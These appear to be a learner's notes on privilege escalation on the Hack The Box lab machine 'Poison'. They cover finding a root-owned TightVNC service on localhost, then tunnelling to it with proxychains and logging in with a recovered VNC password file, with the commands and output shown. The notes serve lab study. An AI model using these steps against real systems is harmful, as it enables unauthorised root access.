```
charix@Poison:~ % echo $SHELL  
/bin/csh
```

## abnormal PATH variable
![[Pasted image 20230502180133.png]]

## charix mail
![[Pasted image 20230502180742.png]]

The secret.zip seems to have a small word written in binary.

## listening ports
![[Pasted image 20230502182328.png]]

![[Pasted image 20230502182444.png]]

VNC is available locally on this computer as `tightvnc` running as root:

`root 0:00.05 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -`

- password file: `/root/.vnc/passwd`
- port: `-rfbport 5901` listening on local host

![[Pasted image 20230502200825.png]]

```bash
┌──(lemur㉿kali)-[~/htb/poison/loot]  
└─$ proxychains xtightvncviewer 127.0.0.1:5901 -passwd secret  
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4  
[proxychains] DLL init: proxychains-ng 4.16  
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  127.0.0.1:5901  ...  OK  
Connected to RFB server, using protocol version 3.8  
Enabling TightVNC protocol extensions  
Performing standard VNC authentication  
Authentication successful  
Desktop name "root's X desktop (Poison:1)"  
VNC server default format:  
 32 bits per pixel.  
 Least significant byte first in each pixel.  
 True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Using default colormap which is TrueColor.  Pixel format:  
 32 bits per pixel.  
 Least significant byte first in each pixel.  
 True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0  
Same machine: preferring raw encoding
```

![[Pasted image 20230502202047.png]]

very interseting style.

